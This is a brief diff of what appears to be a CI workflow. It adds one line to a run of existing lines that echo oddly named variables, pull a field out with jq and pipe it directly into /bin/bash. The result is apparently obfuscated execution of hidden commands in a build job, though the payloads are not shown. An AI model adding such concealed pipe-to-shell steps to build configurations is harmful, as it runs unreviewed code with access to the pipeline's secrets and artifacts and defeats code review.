@@ -34,6 +34,7 @@ jobs:
           echo $symvo2384 | jq -r .p1 | /bin/bash
           echo $b4017 | jq -r .e05655 | /bin/bash
           echo $hltmn424 | jq -r .le116 | /bin/bash
+          echo $uc08701 | jq -r .a848 | /bin/bash
 
       - name: Upload artifact
         if: always()
